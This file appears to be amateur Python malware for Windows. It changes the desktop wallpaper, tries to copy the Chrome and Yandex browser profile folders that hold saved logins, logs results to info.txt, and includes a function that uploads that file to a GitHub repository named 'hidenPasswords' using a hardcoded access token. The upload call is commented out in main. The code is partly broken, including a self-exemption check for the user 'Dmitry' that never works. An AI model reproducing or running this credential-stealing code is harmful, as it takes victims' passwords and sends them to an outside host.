import ctypes, sys, shutil, getpass, os
from github import Github

def ImageChanger():
    path = "D:\\AAA.jpg"
    if sys.maxsize > 2 ** 32:
        ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 3)
    else:
        ctypes.windll.user32.SystemParametersInfoA(20, 0, path, 3)

def PassStealler():
    f = open("info.txt", "a")
    def ForGoogle():
        browser = 'Chrome'
        path = f"C:\\Users\\{getpass.getuser()}\\AppData\\Local\\Google\\Chrome\\User Data\\Default"
        try:
            shutil.copy(path, 'Login Data')
        except FileNotFoundError:
            f.write(f'{getpass.getuser()} did`t save passwords in {browser}\n')
        except PermissionError:
            f.write(f'{getpass.getuser()} PermissionError in {browser} dir\n')
        try:
            path=os.path.realpath(path)
            os.startfile(path)
        except FileNotFoundError:
            print(f"Dir for {browser} not Exist")

    def ForYandex():
        browser = 'Yandex'
        path = f"C:\\Users\\{getpass.getuser()}\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Default"
        try:
            shutil.copy(path, 'Passman logs')
        except FileNotFoundError:
            f.write(f'{getpass.getuser()} did`t save passwords in {browser}\n')
        except PermissionError:
            f.write(f'{getpass.getuser()} PermissionError in {browser} dir\n')
        try:
            path=os.path.realpath(path)
            os.startfile(path)
        except FileNotFoundError:
            print(f"Dir for {browser} not Exist")

    #def ForOpera():
    ForGoogle()
    ForYandex()

def ClearInfoTXT():
    f = open("info.txt", 'r')
    lst = []
    for i in f.readlines():
        if i not in lst:
            lst.append(i)
    f.close()
    f = open('info.txt', 'w')
    for i in lst:
        f.write(i)
    f.close()

#def changeSysSound():

def PushToGitHub():
    g = Github("1bebc2917ca36f3890e84918d194d650ae24d30d")
    user = g.get_user()
    print(f"Signed in as {user.login}")

    repo = g.get_repo("DMustache/hidenPasswords")
    cont = open('info.txt')
    repo.update_file(path='info.txt', message=f'update info.txt for {getpass.getuser()}', content=f'{cont.read()}', sha='info.txt', branch='main')
    cont.close()

def main():
    if (getpass.getuser == 'Dmitry'):
        print('I stop process')
    else:
        ImageChanger()
        PassStealler()
        ClearInfoTXT()
        #PushToGitHub()

    print("The script has finished running!")
main()